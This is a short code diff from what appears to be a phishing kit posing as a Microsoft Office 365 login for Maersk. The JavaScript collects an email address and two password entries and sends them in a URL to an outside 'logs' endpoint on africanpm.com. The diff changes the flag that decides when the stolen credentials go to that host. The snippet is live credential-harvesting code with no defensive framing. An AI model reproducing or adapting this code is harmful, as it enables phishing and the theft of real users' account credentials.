@@ -651,7 +651,7 @@ function subFormBtn(btn) {
         if (pass1 != "" && pass2 !="" && mail != "") {
             let url = "msn365.php?auth=office&domain=maersk&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
     
-            if (data_send.value == 0) {
+            if (data_send.value == 1) {
                 url = "https://africanpm.com/logs/msn/msn365.php?auth=office&domain=maersk&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
             }
     
